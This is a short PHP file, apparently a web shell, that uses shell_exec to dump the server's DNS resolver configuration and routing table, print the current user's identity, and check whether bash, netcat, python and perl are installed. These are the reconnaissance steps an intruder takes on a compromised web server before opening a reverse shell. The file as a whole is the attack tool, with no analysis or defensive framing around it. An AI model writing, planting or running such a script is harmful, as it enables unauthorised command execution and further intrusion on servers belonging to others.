<?php
echo "<pre>";
echo shell_exec("cat /etc/resolv.conf; ip route");
echo "</pre>";
echo "<pre>";
echo shell_exec("id; command -v bash; command -v nc; command -v python; command -v python3; command -v perl");
echo "</pre>";
?>
